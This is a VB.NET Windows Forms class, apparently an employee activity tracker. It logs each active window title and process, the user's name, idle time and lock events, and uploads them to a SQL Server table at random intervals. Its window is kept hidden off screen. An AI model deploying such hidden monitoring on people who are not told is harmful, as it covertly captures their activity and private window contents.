Public Class MainX
    Dim PrevWinTit As String = Nothing
    Dim Locked As Boolean = False
    Dim dtX As New Data.DataTable
    Dim pendingCloseBulkCopy As Boolean = False
    Dim LockedElapse As Long = 0
    Dim LockedElapsed As Boolean = False

    'Idle Settings (First/Second Idle)
    Dim FIdle As Long = 300
    Dim FIdled As Boolean = False
    Dim SIdle As Long = 3600
    Dim SIdled As Boolean = False

    'Generated Files
    Dim PsyLogs As String = Application.StartupPath & "\PsyLogs"
    Dim Starteeed As String = Application.StartupPath & "\PsyStarted"
    Dim Updateeed As String = Application.StartupPath & "\PsyUpdated"

    Private Sub MainX_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'Unnecessary Form Settings
        Me.Location = New Point(-77777, -77777)
        Me.Icon = My.Resources.shell32_16767

        'Name Set
        Try
            Namm = DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName
            Namm = System.Text.RegularExpressions.Regex.Replace(Namm, "(\s\()[^)]*\)", "")
        Catch ex As Exception
            Namm = Uzer
        End Try

        'Handler for PC Locking
        AddHandler Microsoft.Win32.SystemEvents.SessionSwitch, AddressOf CheckLock

        'Create Datatable Columns
        dtX.Columns.Add("IDx", Type.GetType("System.String"))
        dtX.Columns.Add("Username", Type.GetType("System.String"))
        dtX.Columns.Add("Name", Type.GetType("System.String"))
        dtX.Columns.Add("WinTitle", Type.GetType("System.String"))
        dtX.Columns.Add("WinProcess", Type.GetType("System.String"))
        dtX.Columns.Add("TimeLogged", Type.GetType("System.DateTime"))

        'Fail Safe Upload
        If My.Computer.FileSystem.FileExists(PsyLogs) Then
            Dim FailSafed As String = My.Computer.FileSystem.ReadAllText(PsyLogs)
            If Not String.IsNullOrWhiteSpace(FailSafed) Then
                For Each fx As String In FailSafed.Split(vbCrLf.ToCharArray)
                    If Not String.IsNullOrWhiteSpace(fx) Then
                        MasterHazher.Add(fx)
                    End If
                Next
                Dim ClonedHazher As HashSet(Of String) = New HashSet(Of String)(MasterHazher)
                If Not ClonedHazher.LongCount = 0 Then
                    MasterHazher.Clear()
                    MasterHazher.TrimExcess()
                    CopyBulk(ClonedHazher)
                End If
            End If
        End If

        'Updated? 'Started?
        If Not My.Computer.FileSystem.FileExists(Updateeed) Then
            If Not My.Computer.FileSystem.FileExists(Starteeed) Then
                'Start Log
                Dim logDate As DateTime = DateTime.UtcNow
                Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<Start>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
                MasterHazher.Add(Loggg)
                My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)
                My.Computer.FileSystem.WriteAllText(Starteeed, "", False)
            End If
        Else
            My.Computer.FileSystem.DeleteFile(Updateeed, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
        End If

        'ReVar
        pendingCloseBulkCopy = False
        FIdled = False
        SIdled = False

        'Start Timers
        timMain.Enabled = True
        timDBHandler.Enabled = True
    End Sub

    Private Sub CheckLock(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionSwitchEventArgs)
        If e.Reason = Microsoft.Win32.SessionSwitchReason.SessionLock Then
            Locked = True

            Dim logDate As DateTime = DateTime.UtcNow
            Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<PC Locked>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
            MasterHazher.Add(Loggg)
            My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)

            timMain.Enabled = False
            timDBHandler.Enabled = False
            LockedElapse = 0
            timLocked.Enabled = True
        ElseIf e.Reason = Microsoft.Win32.SessionSwitchReason.SessionUnlock Then
            Locked = False
            Dim logDate As DateTime = DateTime.UtcNow
            Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & IIf(LockedElapsed, "<Start>", "<PC Unlocked>").ToString & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
            MasterHazher.Add(Loggg)
            My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)
            If LockedElapsed Then
                My.Computer.FileSystem.WriteAllText(Starteeed, "", False)
            End If

            LockedElapsed = False

            timLocked.Enabled = False
            timMain.Enabled = True
            timDBHandler.Enabled = True
        End If
    End Sub

    Private Sub timMain_Tick(sender As Object, e As EventArgs) Handles timMain.Tick
        Dim WinTit As String = GetActiveWindowTitle()
        Dim WinProc As String = GetActiveWindowProcessName()
        If Not String.IsNullOrWhiteSpace(WinTit) Then
            If Not PrevWinTit = WinTit And Not WinTit = Me.Text And Not (ProcessWhiteList.Contains(WinProc)) Then
                Dim logDate As DateTime = DateTime.UtcNow
                Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & WinTit & vbTab & WinProc & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
                MasterHazher.Add(Loggg)
                My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)

                PrevWinTit = WinTit

                'Reset Idle
                FIdled = False
                SIdled = False
            Else
                'Idle mode
                Dim IdleMode As Long = CLng(GetLastInputTime() / 1000)
                If IdleMode >= FIdle And IdleMode < SIdle Then
                    If Not FIdled Then
                        Dim logDate As DateTime = DateTime.UtcNow
                        Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<Idle>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
                        MasterHazher.Add(Loggg)
                        My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)

                        FIdled = True
                    End If
                ElseIf IdleMode >= SIdle Then
                    If Not SIdled Then
                        If Not LockWorkStation() Then
                            Throw New System.ComponentModel.Win32Exception(Runtime.InteropServices.Marshal.GetLastWin32Error())
                        End If
                        SIdled = True
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub timDBHandler_Tick(sender As Object, e As EventArgs) Handles timDBHandler.Tick
        If Not bgUpload.IsBusy Then
            Dim ClonedHazher As HashSet(Of String) = New HashSet(Of String)(MasterHazher)
            If Not ClonedHazher.LongCount = 0 Then
                MasterHazher.ExceptWith(ClonedHazher)
                timDBHandler.Enabled = False
                bgUpload.RunWorkerAsync(ClonedHazher)
            End If
        End If
    End Sub

    Private Sub timLocked_Tick(sender As Object, e As EventArgs) Handles timLocked.Tick
        LockedElapse += 1
        If LockedElapse = SIdle Then
            LockedElapsed = True

            timLocked.Enabled = False
            timDBHandler.Enabled = False
            timMain.Enabled = False

            Dim logDate As DateTime = DateTime.UtcNow
            Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<End>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
            MasterHazher.Add(Loggg)
            My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, True)
            My.Computer.FileSystem.DeleteFile(Starteeed, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
        End If
    End Sub

    Private Sub bgUpload_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles bgUpload.DoWork
        CopyBulk(CType(e.Argument, HashSet(Of String)))
    End Sub

    Private Sub bgUpload_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles bgUpload.RunWorkerCompleted
        If pendingCloseBulkCopy Then
            timDBHandler.Enabled = False
            timMain.Enabled = False
            timLocked.Enabled = False

            Dim logDate As DateTime = DateTime.UtcNow
            Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<End>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
            MasterHazher.Add(Loggg)

            If Not MasterHazher.LongCount = 0 Then
                CopyBulk(MasterHazher)
                MasterHazher.Clear()
                MasterHazher.TrimExcess()
            End If

            My.Computer.FileSystem.DeleteFile(PsyLogs, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
            My.Computer.FileSystem.DeleteFile(Starteeed, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)

            Environment.Exit(0)
        Else
            Dim xRand As New Random
            timDBHandler.Interval = xRand.Next(420000, 780000)
            timDBHandler.Enabled = True
        End If
    End Sub

    Private Sub MainX_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Not pendingCloseBulkCopy Then
            If bgUpload.IsBusy Then
                pendingCloseBulkCopy = True
                e.Cancel = True
            Else
                timDBHandler.Enabled = False
                timMain.Enabled = False
                timLocked.Enabled = False

                Dim logDate As DateTime = DateTime.UtcNow
                Dim Loggg As String = Uzer & Format(logDate, "yyyyMMddHHmmssffff") & vbTab & Uzer & vbTab & Namm & vbTab & "<End>" & vbTab & "<App>" & vbTab & Format(logDate, "yyyy-MM-dd HH:mm:ss.000")
                MasterHazher.Add(Loggg)

                If Not MasterHazher.LongCount = 0 Then
                    CopyBulk(MasterHazher)
                    MasterHazher.Clear()
                    MasterHazher.TrimExcess()
                End If

                My.Computer.FileSystem.DeleteFile(PsyLogs, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)
                My.Computer.FileSystem.DeleteFile(Starteeed, FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently, FileIO.UICancelOption.DoNothing)

                Environment.Exit(0)
            End If
        End If
    End Sub

    Private Sub CopyBulk(ByVal hazsh As HashSet(Of String))
        Try
            Using conX As New Data.SqlClient.SqlConnection(sqlCon), bulkX As New Data.SqlClient.SqlBulkCopy(sqlCon, Data.SqlClient.SqlBulkCopyOptions.TableLock Or Data.SqlClient.SqlBulkCopyOptions.UseInternalTransaction Or Data.SqlClient.SqlBulkCopyOptions.FireTriggers)
                bulkX.DestinationTableName = "PsyMain"
                For Each Strr As String In hazsh
                    Dim rowStr As String() = Strr.Split(vbTab.ToCharArray)
                    dtX.Rows.Add(rowStr)
                Next

                conX.Open()
                With bulkX
                    .BulkCopyTimeout = 0
                    .BatchSize = 0
                    .WriteToServer(dtX)
                End With
                conX.Close()
                dtX.Clear()
            End Using

            'clean MasterHazher
            MasterHazher.ExceptWith(hazsh)
            MasterHazher.TrimExcess()

            'Update FailSafe
            Dim Loggg As String = String.Join(vbCrLf, MasterHazher)
            My.Computer.FileSystem.WriteAllText(PsyLogs, Loggg & vbCrLf, False)
        Catch ex As Exception
            Console.WriteLine(Err.Source & vbCrLf & Err.Description)
        End Try
    End Sub

    Private Sub MainX_Move(sender As Object, e As EventArgs) Handles MyBase.Move
        If Not Me.Left = -77777 Then
            Me.Left = -77777
        End If
        If Not Me.Top = -77777 Then
            Me.Top = -77777
        End If
    End Sub
End Class